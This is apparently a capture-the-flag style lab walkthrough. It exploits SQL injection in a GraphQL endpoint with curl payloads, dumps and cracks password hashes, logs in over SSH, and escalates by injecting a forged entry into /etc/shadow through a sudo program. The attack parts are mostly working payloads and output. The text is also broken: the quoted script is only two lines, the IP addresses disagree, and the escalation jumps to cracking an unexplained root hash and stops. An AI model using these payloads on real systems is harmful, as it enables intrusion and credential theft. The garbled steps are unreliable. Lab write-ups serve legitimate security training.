Walkthrough

Exploitation Guide for Graph

Summary

In this guide we will exploit an exposed GraphQL instance with SQL injection to get a password and gain a foothold. We will then take advantage of a newline injection vulnerability located in a custom program to gain root access.

This walkthrough uses the following versions of software:

  • Kali 2022.2

  • nmap 7.9.2

  • hashcat v6.2.5

Enumeration

We start the enumeration process with an nmap scan.

(kalikali)-[~]
$ nmap 192.168.120.149           
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-03 13:15 EDT
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 53.42% done; ETC: 13:15 (0:00:07 remaining)
Nmap scan report for 192.168.120.224
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds

The output reveals an HTTP server on port 80. We open a web browser and navigate to the target IP to find a blog.

The caption makes mention of "newer technologies in place". We now turn our attention to content discovery and start a web fuzzer in the background. For this target, we will be using a tool called rustbuster.

rustbuster dir --url http://192.168.120.149 --wordlist /opt/payloads/seclist/Discovery/Web-Content/raft-small-words.txt

The output reveals a GraphQL endpoint.

Exploitation

We can use inql to help us interact with the GraphQL service.

$ inql -t http://192.168.120.149/graphql

[+] DONE

This dumps the whole schema into a folder named after the target. We discover one endpoint named "users". Let's create a request to this endpoint.

We encounter an error message that requires us to input a specific parameter. Checking out the users.query dump, the first argument is named "searchTerm". We pass this argument to the endpoint.

<!-- Spencer 05-25-2022: Please add command examples of how these graphql queries are executed. Probably curl -->

curl -i -H 'Content-Type: application/json' -X POST -d '{"query":"{ users(searchTerm: "a") }"}

' http://192.168.120.149/graphql


{"query":"{ users(searchTerm: \"a\") }"}

...

HTTP/1.1 200 OK

X-Powered-By: Express

{"data":{"users":["admin","jane"]}}

In this case, GraphQL does not enforce sufficient input validation when passing arguments to their corresponding endpoints. Taking note of this, we turn our attention to testing different types of injection attacks. Given the context of the application we decide to check for SQL injection, and our testing confirms that the target is vulnerable.

curl -i -H 'Content-Type: application/json' -X POST -d ' {"query":"{ users(searchTerm: \"'\") }"}

' http://192.168.120.149/graphql

...

{"errors":[{"message":"SQLITE_ERROR: unrecognized token: \"'\"","locations":[{"line":1,"column":3}],"path":["users"]}],"data":{"users":null}}

Let's exploit this SQL injection manually, as we have to deal with escape characters.

We can use UNION with 1 column.

curl -i -H 'Content-Type: application/json' -X POST -d '{"query":"{ users(searchTerm: \"'union select 'xyz' -- -\") }"}

' http://192.168.120.149/graphql

...

{"data":{"users":["admin","jane","josh","xyz"]}}

Let's attempt to dump all of the tables.

curl -i -H 'Content-Type: application/json' -X POST -d '{"query":"{ users(searchTerm: \"'union SELECT sql FROM sqlite_master WHERE type='table'; -- -\") }"}

' http://192.168.120.149/graphql

...

{"data":{"users":["CREATE TABLE sqlite_sequence(name,seq)","CREATE TABLE users (\n id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,\n username VARCHAR(255) NOT NULL UNIQUE,\n password_hash VARCHAR(255) NOT NULL\n )","admin","jane","josh"]}}

Next, we move on to dumping users and their corresponding hashes.

curl -i -H 'Content-Type: application/json' -X POST -d '{"query":"{ users(searchTerm: \"'union SELECT username||':'||password_hash FROM users -- -\") }"}

' http://192.168.120.149/graphql

...

{"data":{"users":["admin","admin:$6$PRyGjElQ$unCSC/NlXu2KsYEjc1RuIqduAnPpPEwGg5diM4mZZbzhEWIWjhvlaoROBf5UgLWUFUFiEXSBjBmVENBbHO5oK/","jane","jane:$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.","josh","josh:$6$g744Ii0AvY$Oce4aPVtE96encnfV5q1MboCBHyz74qw0R6d/iZKxIrHSFUtG3z7LfbAfHu1aoYRgbseH0tG3.nyGZ9qX1Ean."]}}

Lastly, we can attempt to crack these hashes with hashcat.

echo "$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX." > hash.txt

hashcat -m 1800 -a 0 hash $rockyou --force -o cracked

$6$4BlcfbYDsQp3BMG$vwPo.Fpjadmz2jqPFPxrNusB8zCM2TBnNU1HuwkO9vWWvt3jFbpJ0ymelX/fyNgoLW9vQ/fJI0mL8vqw96HMX.:oakland

From our results, we find the valid set of credentials jane:oakland that we can use to login to SSH.

(rootkali)-[~/home/Graph]
# ssh jane@192.168.120.149

Escalation

Once on the box, we begin enumerating the target system by checking the sudo rules.

jane@graph:/home$ sudo -l

Matching Defaults entries for jane on graph:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jane may run the following commands on graph:

(ALL : ALL) /usr/local/bin/pass-gen

While we notice that we can execute pass-gen as root user, we do not have access to the source code. After attempting to run the program, we notice that our password changes to a random value.

Moving forward with the enumeration process, we notice a few messages in our inbox.

- Hey, you can find the password updater script we talked about earlier in my home directory. Looking forward to your feedback!

- Hey, thanks for deploying the script. Josh told me that there is yet another critical vulnerability, I have to contact you ASAP!

We see the outdated version of the script located in the src folder located in our home directory. The last message suggests there is a "critical vulnerability" in the script. We proceed by opening the source file located at /home/jane/src for further review.

#! /usr/bin/env python2

print  "%s: error" % os.path.basename(sys.argv[0])

The script allows us to input the duration of the newly set password. It updates the entry in /etc/shadow without removing newlines, meaning that it is vulnerable to a newline injection. We can create a new entry for josh with a password hash that we know. Let's generate a new hash.

$ mkpasswd -m sha512crypt password123

$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1

We can then use the hash in a new entry for the user josh.

$ sudo pass-gen '1337:7:::

josh:$6$xA4CCC7YQzDl40A$3lCVdpI59TEDZRqIKdFWB4daOmFq3FSgESYnhDNpiZRlitXs17G.HFKXmq2eMkoWJLC0xGPL2DRxJXupo/Orf1:19078:0:99999'

First, we grab the hash of the root user and save it into a file called hash

echo '$6$4kpaRzOQ$mG9wRaxktdkRgXRVp4tyZkNYub/95YRuZ7P8AybjSGsBCh/0HotsXCq77XI6LOcZfn.lxIzc4NOaHvkROXRMa.' > hash

Now, we can use hashcat to crack the hash

hashcat -m 1800 -a 0 hash $rockyou --force -o cracked
